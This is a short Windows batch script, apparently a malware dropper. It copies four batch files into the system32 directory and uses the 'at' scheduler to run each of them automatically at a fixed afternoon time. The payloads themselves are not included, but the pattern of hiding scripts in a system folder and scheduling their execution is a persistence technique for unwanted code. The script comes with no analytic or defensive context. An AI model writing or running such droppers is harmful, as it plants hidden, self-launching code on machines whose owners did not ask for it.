@echo off
start/max .
copy comp.bat %windir%\system32
copy copy.bat %windir%\system32
copy info.bat %windir%\system32
copy limp.bat %windir%\system32
at 14:00 %windir%\system32\comp.bat
at 14:00 %windir%\system32\copy.bat
at 14:00 %windir%\system32\info.bat
at 14:01 %windir%\system32\limp.bat